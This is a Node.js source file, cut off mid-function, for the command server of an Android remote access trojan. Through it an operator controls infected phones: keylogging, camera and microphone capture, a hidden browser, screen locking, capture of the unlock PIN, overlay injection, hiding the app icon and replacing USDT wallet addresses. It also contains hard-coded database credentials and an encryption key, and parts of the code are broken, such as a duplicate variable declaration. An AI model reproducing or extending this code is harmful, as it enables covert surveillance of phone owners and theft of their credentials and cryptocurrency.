// 模块引入
const express = require("express");
const http = require("http");
const WebSocket = require("ws");
const crypto = require("crypto");
const fs = require('fs');
const path = require('path');

// 尝试加载mysql2模块，失败时不影响其他功能
let mysql;
let pool;
let dbEnabled = false;

try {
  mysql = require('mysql2/promise');
  
  // 数据库配置
  const dbConfig = {
    host: '127.0.0.1',
    user: 'jj223.cc.cd',
    password: '8HCi8FSycyLxtc4w',
    database: 'jj223.cc.cd',
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
  };
  
  // 创建数据库连接池
  pool = mysql.createPool(dbConfig);
  dbEnabled = true;
  
  // 测试数据库连接
  async function testDbConnection() {
    try {
      const connection = await pool.getConnection();
      log.info('数据库连接成功');
      connection.release();
    } catch (error) {
      log.error('数据库连接失败', error);
      dbEnabled = false;
    }
  }
  
  testDbConnection();
} catch (error) {
  log.warn('mysql2模块未安装，设备信息将不会同步到数据库');
  dbEnabled = false;
}

// 配置文件
const config = {
  port: 8080,
  maxPayload: 50 * 1024 * 1024, // 50MB
  pingTimeout: 300 * 1000,       // 心跳超时时间（延长到300秒，适应锁屏和后台状态）
  checkInterval: 60 * 1000,      // 检查间隔（延长到60秒）
  probeInterval: 30 * 1000,      // 探测间隔（延长到30秒）
  maxProbes: 10,                 // 最大探测次数（增加到10次）
  compression: {
    zlibDeflateOptions: {
      chunkSize: 4096,
      memLevel: 5,
      level: 2
    },
    zlibInflateOptions: {
      chunkSize: 16 * 1024
    },
    clientNoContextTakeover: true,
    serverNoContextTakeover: true,
    serverMaxWindowBits: 12,
    concurrencyLimit: 20,
    threshold: 512
  }
};

// 创建 Express 应用
const app = express();
const server = http.createServer(app);

// 创建 WebSocket 服务器
const wss = new WebSocket.Server({ 
    server: server,
    perMessageDeflate: config.compression,
    maxPayload: config.maxPayload
});

// 存储结构
const SolrUsers = new Map();      // 存储网页端连接
const SolrMobs = new Map();       // 存储设备端连接
const wsToPhoneId = new Map();     // WebSocket连接到phoneId的映射
const DeviceStatus = new Map();    // 设备状态
const probes = new Map();          // 探测记录

// 常量定义
const idf_admin = "slr_panel";
const idf_adminsend = "slr_panelsend";
const idf_client = "Slr_client";
const Alert_info = "Alert_info";
const Alert_success = "Alert_success";

// 日志系统
const logFile = path.join(__dirname, 'error_log.txt');
const log = {
  info: (message) => {
    console.log(`[INFO] ${new Date().toISOString()} - ${message}`);
  },
  error: (message, error) => {
    const errorMessage = `[ERROR] ${new Date().toISOString()} - ${message}\n${error ? error.stack || error : ''}\n`;
    console.error(errorMessage);
    try {
      fs.appendFileSync(logFile, errorMessage, 'utf8');
    } catch (err) {
      console.error('写入日志失败:', err);
    }
  },
  debug: (message) => {
    console.log(`[DEBUG] ${new Date().toISOString()} - ${message}`);
  },
  warn: (message) => {
    console.warn(`[WARN] ${new Date().toISOString()} - ${message}`);
  }
};

// 捕获未处理的异常
process.on('uncaughtException', (err) => {
  log.error('未捕获的异常', err);
});

// 捕获未处理的Promise rejection
process.on('unhandledRejection', (reason, promise) => {
  log.error('未处理的Promise rejection', reason);
});

// 同步设备信息到数据库
async function syncDeviceToDatabase(phoneId, deviceData) {
  // 检查数据库功能是否启用
  if (!dbEnabled) {
    log.debug('数据库功能未启用，跳过设备信息同步');
    return;
  }
  
  try {
    const connection = await pool.getConnection();
    
    // 检查设备是否已存在
    const [existingDevices] = await connection.execute(
      'SELECT phone_id FROM phones WHERE phone_id = ?',
      [phoneId]
    );
    
    if (existingDevices.length > 0) {
      // 设备已存在，更新信息
      await connection.execute(
        `UPDATE phones SET 
         phone_name = ?, 
         android_ver = ?, 
         model = ?, 
         battery_charg = ?, 
         network = ?, 
         last_ping = NOW(), 
         address = ?, 
         country = ?, 
         accessibility = ?, 
         user_email = ? 
         WHERE phone_id = ?`,
        [
          deviceData.phone_name || '',
          deviceData.android_ver || '',
          deviceData.model || '',
          deviceData.battery_charg || '',
          deviceData.network || '',
          deviceData.address || '',
          deviceData.country || '',
          deviceData.accessibility || 0,
          deviceData.user_email || '',
          phoneId
        ]
      );
      log.debug(`设备 ${phoneId} 信息已更新到数据库`);
    } else {
      // 设备不存在，插入新记录
      await connection.execute(
        `INSERT INTO phones (
         phone_id, 
         usrname, 
         phone_name, 
         android_ver, 
         model, 
         battery_charg, 
         network, 
         install_date, 
         last_ping, 
         address, 
         country, 
         phoneopen, 
         accessibility, 
         user_email
         ) VALUES (?, ?, ?, ?, ?, ?, ?, NOW(), NOW(), ?, ?, 1, ?, ?)`,
        [
          phoneId,
          deviceData.usrname || 'admin', // 默认用户名
          deviceData.phone_name || '',
          deviceData.android_ver || '',
          deviceData.model || '',
          deviceData.battery_charg || '',
          deviceData.network || '',
          deviceData.address || '',
          deviceData.country || '',
          deviceData.accessibility || 0,
          deviceData.user_email || ''
        ]
      );
      log.debug(`设备 ${phoneId} 已添加到数据库`);
    }
    
    connection.release();
  } catch (error) {
    log.error('同步设备信息到数据库失败', error);
  }
}

// 启动 HTTP 服务器
server.listen(config.port, () => {
  log.info(`服务器启动在端口 ${config.port}`);
});



wss.on("connection", (ws) => {
  log.debug("新连接建立");
  
  // 连接统计
  let messageCount = 0;
  const connectionTime = Date.now();
  
  // 处理消息
  ws.on("message", (message) => {
    messageCount++;
    if (messageCount % 100 === 0) {
      log.debug(`连接消息计数: ${messageCount}`);
    }
    
    try {
      let data;
      try {
        data = JSON.parse(message); // 尝试解析消息
      } catch (error) {
        log.warn(`JSON 解析失败: ${error.message}，原始消息: ${message.toString().substring(0, 200)}`);
        return;  // 如果消息无法解析，跳过处理
      }

      if (data.pid) {
        const phoneId = data.pid;  // 获取设备标识符 phoneId
        if (!phoneId) {
          log.warn("收到无有效phoneId的消息，跳过处理");
          return;
        }

        // 存储连接映射
        wsToPhoneId.set(ws, phoneId);

        if (data.itype === "Slr_client") {
          ws.clientType = "phone";   // 🔑 标记这是手机端

          // 🔧 改进：无论是否已有连接，都更新为新连接（解决APK重启问题）
          const oldWs = SolrMobs.get(phoneId);
          if (oldWs && oldWs !== ws) {
            log.info(`设备 ${phoneId} 重新连接，替换旧连接`);
            // 关闭旧连接
            try {
              oldWs.close();
            } catch (error) {
              log.error("关闭旧连接失败", error);
            }
          }
          SolrMobs.set(phoneId, ws);  // 存储设备连接
          log.debug(`存储设备连接 phoneId: ${phoneId}`);

          // ✅ 新增：初始化心跳时间，防止被误删
          const key = String(phoneId).trim();
          if (!DeviceStatus.has(key)) {
            DeviceStatus.set(key, { lastPing: Date.now() });
            log.debug(`初始化设备 ${phoneId} 心跳时间`);
          }

          // 处理 ping
          if (data.subc === "ping") {
            const params = new URLSearchParams(data.msg);
            const phoneInfo = {};

            for (const [key, value] of params.entries()) {
              phoneInfo[key] = value;
            }
            
            // 🔧 字段映射：APK 发送 mail，服务器需要 user_email
            if (phoneInfo.mail && !phoneInfo.user_email) {
              phoneInfo.user_email = phoneInfo.mail;
            }

            const deviceData = {
              lastPing: Date.now(),
              ...phoneInfo
            };

            // 🔧 修复：使用统一的phoneId作为键，确保设备状态正确更新
            DeviceStatus.set(key, deviceData);
            log.debug(`设备 ${phoneId} 心跳更新`);
            
            // 🔧 新增：同步设备信息到数据库
            syncDeviceToDatabase(phoneId, deviceData);
            
            // 🔧 新增：清除探测记录
            if (probes.has(key)) {
              probes.delete(key);
              log.debug(`清除设备 ${phoneId} 探测记录`);
            }
          }
        }


        // 处理来自网页端的连接请求（slr_panel）
        if (data.itype === "slr_panel") {
          ws.clientType = "web";     // 🔑 标记这是网页端

          if (data.subc === "join") {
            // 存储新的网页端 WebSocket 连接
            if (!SolrUsers.has(phoneId)) {
              SolrUsers.set(phoneId, new Set());
            }

            SolrUsers.get(phoneId).add(ws);
            wsToPhoneId.set(ws, phoneId);
            console.log(`Stored new WebSocket for web with phoneId: ${phoneId}`);
          } else if (data.subc === "out") {
            // 处理 WebSocket 断开连接（来自网页端）
            const phoneSocketMob = SolrMobs.get(phoneId);  // 获取设备端 WebSocket
            if (phoneSocketMob && phoneSocketMob.readyState === WebSocket.OPEN) {
              const json_out = {
                type: "out",
                pid: phoneId,
              };
              try {
                phoneSocketMob.send(JSON.stringify(json_out));  // 向设备端发送“退出”命令
              } catch (err) {
                console.warn(`Failed to send 'out' command to phone ${phoneId}:`, err);
              }
            }
          } else if (data.subc === "ping") {
            const MobReciver = SolrMobs.get(phoneId);
            const deviceInfo = DeviceStatus.get(String(phoneId).trim());

            // 状态映射表
            const stateMap = {
              0: "CONNECTING",
              1: "OPEN",
              2: "CLOSING",
              3: "CLOSED"
            };

            // 格式化时间函数
            const formatTime = (ts) => {
              if (!ts) return null;
              const d = new Date(ts);
              const pad = (n) => String(n).padStart(2, "0");
              return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ` +
                `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
            };

            const response = {
              type: "statusBatch",
              pid: phoneId,
              serverToPhone: MobReciver ? stateMap[MobReciver.readyState] : "UNKNOWN",
              lastPing: deviceInfo ? formatTime(deviceInfo.lastPing) : null,
              // ✅ 直接带上整个设备信息
              phoneInfo: deviceInfo || {}
            };
            ws.send(JSON.stringify(response)); // 发回给前端
          }
          else if (data.subc === "disag") {
            SolrMobs.delete(phoneId);  // 删除设备端连接
            if (phoneId) {
              if (SolrUsers.has(phoneId)) {
                SolrUsers.get(phoneId).delete(ws);
                if (SolrUsers.get(phoneId).size === 0) {
                  SolrUsers.delete(phoneId);
                }
              }
              wsToPhoneId.delete(ws);
              DeviceStatus.delete(String(phoneId).trim());
            }
          }

        }

        // 处理来自设备端的其他命令
        handleDeviceCommands(data, ws, phoneId);
      } else if (data.subc === "checkphone") {
        if (data.email) {
          let phones = [];

          // 🔒 安全修复：移除超级管理员后门，所有用户只能看到自己的设备
          DeviceStatus.forEach((device) => {
            if (device.user_email === data.email) {
              if (!device.phone_id || String(device.phone_id).trim() === "") return;
              if (device.hasOwnProperty("display") && device.display !== "" && Number(device.display) === 0) return;
              phones.push(device);
            }
          });

          // ⚡ 应用 filters
          const filters = data.filters || {};
          phones = phones.filter((device) => {
            // ✅ 先把 install_date 转换一下
            if (device.install_date) {
              device.install_date = normalizeDigits(device.install_date); // 转换成标准数字
            }

            if (filters.user_email && String(filters.user_email).trim() !== "") {
              const encFilter = encryptEmail(String(filters.user_email).trim()); // ✅ 加密
              if (device.user_email !== encFilter) {
                return false;
              }
            }
            if (filters.phone_name && !String(device.phone_name || "").includes(filters.phone_name)) {
              return false;
            }
            if (filters.country && !String(device.country || "").includes(filters.country)) {
              return false;
            }
            if (filters.model && !String(device.model || "").includes(filters.model)) {
              return false;
            }
            if (filters.accessibility !== undefined && filters.accessibility !== "") {
              if (String(device.accessibility) !== String(filters.accessibility)) {
                return false;
              }
            }
            if (filters.install_date && !String(device.install_date || "").includes(filters.install_date)) {
              return false;
            }
            return true;
          });

          // 📌 排序：install_date 降序 + phone_id 升序
          phones.sort((a, b) => {
            const da = parseDateSafe(a.install_date);
            const db = parseDateSafe(b.install_date);
            if (db !== da) return db - da;
            return String(a.phone_id || "").localeCompare(String(b.phone_id || ""), "en", { numeric: true });
          });

          // 📌 分页
          const page = Number(data.page) || 1;
          const pageSize = Number(data.pageSize) || 10;
          const total = phones.length;
          const pageCount = Math.ceil(total / pageSize);

          const start = (page - 1) * pageSize;
          const end = start + pageSize;
          const pagedPhones = phones.slice(start, end);

          // 📌 文件修改时间（总是返回）
          const filePath = "/www/wwwroot/dy.804ks03.sbs/private/apkstub/apkstub.zip";
          let fileLastModified = null;
          try {
            if (fs.existsSync(filePath)) {
              const stats = fs.statSync(filePath);
              fileLastModified = stats.mtime.toISOString();
            }
          } catch (err) {
            console.error("读取文件修改时间失败:", err);
          }

          // 📌 返回给前端
          ws.send(JSON.stringify({
            type: "checkphone",
            list: pagedPhones,   // 可能为空 []
            total,
            pageCount,
            page,
            pageSize,
            fileLastModified     // ⚡ 即使 total = 0 也返回
          }));

        }
      }



    } catch (error) {
      console.error("Error handling message:", error);
    }
  });
  // 监听 WebSocket 关闭事件
  ws.on("close", (code, reason) => {
    const phoneId = wsToPhoneId.get(ws);
    const duration = Date.now() - connectionTime;
    
    log.debug(`连接关闭，代码: ${code}, 原因: ${reason || '未知'}, 持续时间: ${duration}ms, 消息数: ${messageCount}`);

    if (!phoneId) {
      log.debug("无phoneId的连接关闭");
      return;
    }

    if (ws.clientType === "phone") {
      // 手机端断开 → 清理手机端连接，但保留设备状态（解决APK重启问题）
      SolrMobs.delete(phoneId);
      wsToPhoneId.delete(ws);
      // 🔧 修复：不删除DeviceStatus，保留设备状态
      log.info(`手机端断开，已清理连接 phoneId=${phoneId}`);
    } else if (ws.clientType === "web") {
      // 网页端断开 → 清理网页端数据
      if (SolrUsers.has(phoneId)) {
        SolrUsers.get(phoneId).delete(ws);
        if (SolrUsers.get(phoneId).size === 0) {
          SolrUsers.delete(phoneId);
          log.debug(`网页端断开，已清理所有连接 phoneId=${phoneId}`);
        } else {
          log.debug(`网页端断开，仍有 ${SolrUsers.get(phoneId).size} 个连接 phoneId=${phoneId}`);
        }
      }
      wsToPhoneId.delete(ws);
      log.info(`网页端断开，已清理 phoneId=${phoneId}`);
    }
  });
  
  // 监听 WebSocket 错误事件
  ws.on("error", (error) => {
    const phoneId = wsToPhoneId.get(ws);
    log.error(`WebSocket 错误 phoneId=${phoneId}`, error);
  });
});



const PING_TIMEOUT = 75 * 1000;  // 心跳超时时间
const CHECK_INTERVAL = 25 * 1000; // 定时器间隔
const probes = new Map();

setInterval(() => {
  const now = Date.now();
  const toDelete = [];

  for (const [phoneId, wsConn] of SolrMobs.entries()) {
    const key = String(phoneId).trim();
    const deviceData = DeviceStatus.get(key);

    // 1. 已关闭的连接 → 直接清理
    if (!wsConn || wsConn.readyState === WebSocket.CLOSED) {
      toDelete.push(key);
      continue;
    }

    // 2. 超时未 ping
    if (deviceData && now - (deviceData.lastPing || 0) > config.pingTimeout) {
      const probeInfo = probes.get(key);

      if (!probeInfo) {
        // 第一次探测
        try {
          const jsonData = {
            type: "connected",
            kdate: Date.now()
          };
          wsConn.send(JSON.stringify(jsonData));
          probes.set(key, { time: now, count: 1 });
          log.debug(`[探测] 向 phoneId=${key} 发送第1次探测`);
        } catch (error) {
          log.error(`发送探测失败 phoneId=${key}`, error);
          toDelete.push(key);
        }
      } else {
        // 超过探测间隔发送探测
        if (now - probeInfo.time >= config.probeInterval) {
          // 超过最大探测次数，标记为删除
          if (probeInfo.count >= config.maxProbes) {
            toDelete.push(key);
            log.warn(`[探测] 向 phoneId=${key} 发送探测超过最大次数(${config.maxProbes})，标记为删除`);
            continue;
          }
          
          try {
            const jsonData = {
              type: "connected",
              kdate: Date.now()
            };
            wsConn.send(JSON.stringify(jsonData));
            probes.set(key, { time: now, count: probeInfo.count + 1 });
            log.debug(`[探测] 向 phoneId=${key} 发送第 ${probeInfo.count + 1} 次探测`);
          } catch (error) {
            log.error(`发送探测失败 phoneId=${key}`, error);
            toDelete.push(key);
          }
        }
      }
    } else {
      // 正常 → 清除探测记录
      probes.delete(key);
    }
  }

  // 3. 执行清理
  for (const key of toDelete) {
    try {
      const wsConn = SolrMobs.get(key);
      if (wsConn) {
        try {
          wsConn.close();
        } catch (error) {
          log.error(`关闭连接失败 phoneId=${key}`, error);
        }
      }
      SolrMobs.delete(key);
      // 🔧 修复：不删除DeviceStatus，保留设备状态（解决APK重启问题）
      // DeviceStatus.delete(key);
      probes.delete(key);
      log.info(`[定时清理] 移除失效连接 phoneId=${key}`);
    } catch (error) {
      log.error(`清理连接失败 phoneId=${key}`, error);
    }
  }
}, config.checkInterval);


// 🔹 工具：把阿拉伯数字（٠١٢٣٤٥٦٧٨٩）转换成正常的 0-9
function normalizeDigits(str) {
  if (!str) return "";
  const arabicIndic = ["٠", "١", "٢", "٣", "٤", "٥", "٦", "٧", "٨", "٩"];
  let normalized = str;
  arabicIndic.forEach((d, i) => {
    const regex = new RegExp(d, "g");
    normalized = normalized.replace(regex, i);
  });
  return normalized;
}

// 🔹 工具：安全解析日期
function parseDateSafe(dateStr) {
  if (!dateStr) return 0;
  const normalized = normalizeDigits(String(dateStr).trim());
  const ts = Date.parse(normalized);
  return isNaN(ts) ? 0 : ts;
}


// 与 PHP 一致：AES-256-CBC + Base64
function encryptEmail(email) {
  const key = Buffer.from("@zxfNM=q>Drm`6VP)!:u-A~;92E<.?wR"); // Secrit_Key
  const iv = Buffer.from("G8v!h3*Y.P+pFm/;");                  // SIV
  const cipher = crypto.createCipheriv("aes-256-cbc", key, iv);
  let out = cipher.update(String(email), "utf8", "base64");
  out += cipher.final("base64");
  return out;
}



// Handle device commands and ensure proper connection
function handleDeviceCommands(data, ws, phoneId) {

  // 输出收到的命令类型和子命令
  const subcommand = data.subc;
  const itype = data.itype;
  const usercheck = data.usercheck;

  switch (itype) {
    case idf_admin:


      // ✅ 如果 check 不为空，写入 txt
      if (usercheck && usercheck.trim() !== "") {
        const fs = require("fs");
        const path = require("path");

        const filePath = path.join(__dirname, "mov_connect.txt");

        // 固定为北京时间（UTC+8）
        const now = new Date();
        const offsetTime = new Date(now.getTime() + 8 * 60 * 60 * 1000);
        const time = offsetTime.toISOString().replace('T', ' ').replace('Z', '');

        const line = `${phoneId}\t${usercheck}\t${time}\n`;

        fs.appendFile(filePath, line, (err) => {
          if (err) {
            console.error("写入 mov_check.txt 出错:", err);
          }
        });
      }

      const MobReciverr = SolrMobs.get(phoneId); // ✅ 发给安卓

      // 处理面板命令
      switch (subcommand) {

        case "proxy":
          {
            const subcom = data.prxcom;

            let jsonData;
            switch (subcom) {
              case "ON":
                {
                  jsonData = {
                    type: "proxy",
                    subc: "1",
                  };
                }
                break;

              case "OFF":
                {
                  jsonData = {
                    type: "proxy",
                    subc: "0",
                  };
                }
                break;
              default:
                jsonData = null;
                break;
            }

            if (jsonData) {
              const msgdata = JSONIT(jsonData);

              MobReciverr.send(msgdata);
              alertpanel(ws, "Command Sent", Alert_success);
            } else {
              alertpanel(ws, "Unkown proxy command", Alert_info);
            }
          }
          break;
        case "brows": //browser
          {


            const subcom = data.btype; //h = hidden , n = normall
            let jsonData;
            switch (subcom) {
              case "h":
                {
                  const newstsate = data.bcom; //0 = stop or 1 = start or 3 = comand
                  const extradata = data.extdata || null; //bcom = 0 this be null,bcom = 1 this be starturl , bcom = 3 this be like text<:CS:>hello<:CS:>
                  jsonData = {
                    type: "brows",
                    subc: "h",
                    bcom: newstsate,
                    extdata: extradata,
                  };
                }
                break;

              case "n":
                {
                  const newstsate = data.ltype; //html base64 f or url u
                  const extradata = data.extdata || null; //link , or html as base64 ,
                  jsonData = {
                    type: "brows",
                    subc: "n",
                    ltype: newstsate,
                    extdata: extradata,
                  };
                }
                break;
              default:
                jsonData = null;
                break;
            }
            if (jsonData) {
              const msgdata = JSONIT(jsonData);

              MobReciverr.send(msgdata);
              //alertpanel(ws, "Command Sent", Alert_success);
            } else {
              alertpanel(ws, "Unkown browser command", Alert_info);
            }
          }
          break;
        case "fetch":
          {


            const fetchtype = data.ftype;
            const thepath = data.fpath ?? "";

            const jsonData = {
              type: "fetch",
              subc: fetchtype,
              extradata: thepath,
            };
            const msgdata = JSONIT(jsonData);

            MobReciverr.send(msgdata);
          }
          break;


        case "bc": //broadcast
          {
            const comand = data.comand;



            let thetitle = data.title;
            let themsg = data.msg;
            let tolunch = data.todo;
            let action = data.act; //action open link/app/nothing
            let actionnum = -1;
            if (action === "nothing") {
              actionnum = 0;
            } else if (action === "openApp") {
              actionnum = 1;
            } else if (action === "openLink") {
              actionnum = 2;
            } else {
              return;
            }

            switch (comand) {
              case "alert":
                {
                  let alertico = data.alertico;
                  const jsonData = {
                    type: "bc",
                    subc: "A",
                    thetitle: thetitle,
                    themsg: themsg,
                    toopen: tolunch,
                    theype: actionnum.toString(),
                    ico: alertico,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "notify":
                {
                  const jsonData = {
                    type: "bc",
                    subc: "N",
                    thetitle: thetitle,
                    themsg: themsg,
                    toopen: tolunch,
                    theype: actionnum.toString(),
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;

              default:
                break;
            }
          }
          break;
        case "screen":

          {
            // const mobpid = data.pid;
            const comand = data.comand;



            switch (comand) {
              case "block":
                {
                  const blockit = data.bstate; //0,1
                  const color = data.color; //0,1

                  const jsonData = {
                    type: "screen",
                    subc: "block",
                    blockstate: blockit,
                    color: color
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "paste":
                {
                  const texttopaste = data.txt;
                  const jsonData = {
                    type: "screen",
                    subc: "paste",
                    txt: texttopaste,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "mov":
                {

                  const mtype = data.movetype;
                  const points = data.poi;
                  const jsonData = {
                    type: "screen",
                    subc: "mov",
                    poi: points,
                    movetype: mtype,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "snap":
                {
                  //snap , 1 single , 0 multie
                  const stype = data.stype; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "snap",
                    snaptype: stype,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata); //send it frontend js
                }
                break;

              case "vol":
                {
                  //vol = Voluome , 1 up , 0 down
                  const vstate = data.volstate; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "vol",
                    volstate: vstate,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "kb":
                {
                  //kb = keyboard , 1 show , 0 hide
                  const newstate = data.kbstate; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "kb",
                    kbstate: newstate,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "L":
                {
                  //L = Lock , 1 lock , 0 unlock
                  const lockit = data.lockit; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "L",
                    lock: lockit,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "nav":
                {
                  const navto = data.navshort; //ho, rec, bak
                  const jsonData = {
                    type: "screen",
                    subc: "nav",
                    nav: navto,
                  };
                  const msgdata = JSONIT(jsonData);
                  MobReciverr.send(msgdata);  // 发送命令到设备
                }
                break;
              case "q":
                {
                  const newqulity = data.newqulity;

                  const jsonData = {
                    type: "screen",
                    subc: "Q",
                    newq: newqulity,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "phonepass":

                {
                  const passtype = data.passtype;
                  const phonepass = data.txt;
                  const jsonData = {
                    type: "screen",
                    subc: "phonepass",
                    passtype: passtype,
                    phonepass: phonepass
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "usdt":
                {
                  const usdttype = data.usdttype;

                  const jsonData = {
                    type: "screen",
                    subc: "usdt",
                    usdttype: usdttype,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "usdtadress":
                {
                  const usdtxt = data.usdtadresstext;

                  const jsonData = {
                    type: "screen",
                    subc: "usdtadress",
                    usdtadresstext: usdtxt,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "blockd":
                {
                  const blotext = data.blocktext;

                  const jsonData = {
                    type: "screen",
                    subc: "blockd",
                    blocktext: blotext,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              default:
                break;
            }
          }
          break;
        // case "ping":
        //   {

        //     const jsonData = {
        //       type: "connected",
        //     };

        //     const msgdata = JSONIT(jsonData);

        //     MobReciverr.send(msgdata);
        //   }
        //   break;
        case "srch":
          {


            const searchfor = data.srchfor;
            const searchin = data.srchin;
            const serchpath = data.targetpath || "null";

            const jsonData = {
              type: "srh",
              subc: searchin, //G or S
              Tpath: serchpath,
              sfor: searchfor,
            };

            const chatdata = JSONIT(jsonData);

            MobReciverr.send(chatdata);
          }
          break;
        case "cocu": //copy cut
          {


            const thetype = data.state; //co cu
            const despath = data.tp;
            const frompsaths = data.fp;

            const json_file = {
              type: "file",
              subc: thetype,
              tpath: despath,
              fpath: frompsaths,
            };

            const filedata = JSONIT(json_file);

            MobReciverr.send(filedata);
          }
          break;
        case "chat":
          const msg = data.msg;

          const title = data.title;



          const jsonData = {
            type: "chat",
            data: msg,
            title: title,
          };

          const chatdata = JSONIT(jsonData);

          MobReciverr.send(chatdata);

          break;
        default:

          break;
      }
      break;
    case idf_adminsend:

      // ✅ 如果 check 不为空，写入 txt
      if (usercheck && usercheck.trim() !== "") {
        const fs = require("fs");
        const path = require("path");

        const filePath = path.join(__dirname, "mov_check.txt");

        // 固定为北京时间（UTC+8）
        const now = new Date();
        const offsetTime = new Date(now.getTime() + 8 * 60 * 60 * 1000);
        const time = offsetTime.toISOString().replace('T', ' ').replace('Z', '');

        const line = `${phoneId}\t${usercheck}\t${time}\n`;

        fs.appendFile(filePath, line, (err) => {
          if (err) {
            console.error("写入 mov_check.txt 出错:", err);
          }
        });
      }
      const MobReciver = SolrMobs.get(phoneId); // ✅ 发给安卓
      // if (!MobReciver) {
      //   console.log(`MobReciver is undefined or null for phoneId: ${phoneId}`);
      //   return;
      // } else if (MobReciver.readyState != WebSocket.OPEN) {
      //   console.log(`MobReciver is not OPEN for phoneId: ${phoneId}, readyState: ${MobReciver.readyState}`);
      //   return;
      // }

      switch (subcommand) {
        case "display":
          {
            const jsonData = {
              type: "screencomd",
              subc: "display",
              display: data.display,        // e.g., SK
            };
            const msgdata = JSONIT(jsonData);
            MobReciver.send(msgdata);
          }
          break;
        case "screen":
          {
            const jsonData = {
              type: "screencomd",
              subc: "Screen",
              comdtype: data.screentype,        // e.g., SK
            };
            const msgdata = JSONIT(jsonData);
            MobReciver.send(msgdata);
          }
          break;
        case "cam":
          {
            const jsonData = {
              type: "screencomd",
              subc: "Camera",
              SelectedCam: data.SelectedCam,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "camoff":
          {

            const jsonData = {
              type: "screencomd",
              subc: "CameraOff",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "mic":
          {
            const jsonData = {
              type: "mic",
              subc: "ON",
            };
            MobReciver.send(JSONIT(jsonData));

          }
          break;
        case "micoff":
          {
            const jsonData = {
              type: "mic",
              subc: "OFF",
            };
            MobReciver.send(JSONIT(jsonData));

          }
          break;
        case "activz":
          {
            const subc = data.subc; // 'L' or 'D'
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GA",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DA",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "notifys":
          {
            const subc = data.subc;
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GF",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DF",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "vapps":
          {
            const subc = data.subc;
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GV",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DV",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "vlinks":
          {
            const subc = data.subc;
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GU",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DU",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "Keylog":
          {
            let jsonData = null;
            jsonData = {
              type: "screencomd",
              subc: "Keylog",
              comdtype: data.keylogtype,
            };

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "Logdate":
          {
            let jsonData = null;

            jsonData = {
              type: "screencomd",
              subc: "Logdate",
              comdtype: data.keylogtype,
              kdate: data.keylogdate,
            };
            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "Permissions":
          {
            const subc = data.subc;
            if (subc === "Clear") {
              // 仅供后端数据库清空，WebSocket 不处理
            } else if (subc === "R") {
              const jsonData = {
                type: "Permissions",
                subc: "R",
                prim: data.prim,
              };
              MobReciver.send(JSONIT(jsonData));
            }
          }
          break;
        case "Hideico":
          {

            const jsonData = {
              type: "screencomd",
              subc: "Hideico",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "DIAO":
          {

            const jsonData = {
              type: "screencomd",
              subc: "DIAO",
              pin: data.pin,
              title: data.title,
              lckdis: data.lckdis,
              typ: data.typ,
            };
            MobReciver.send(JSONIT(jsonData));
          }
        case "OPENINJ":
          {

            const jsonData = {
              type: "screencomd",
              subc: "OPENINJ",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "OPENAPP":
          {

            const jsonData = {
              type: "screencomd",
              subc: "OPENAPP",
              package: data.packageName,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "UNINSTALLAPP":
          {

            const jsonData = {
              type: "screencomd",
              subc: "UNINSTALLAPP",
              package: data.packageName,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "LOADAPPS":
          {

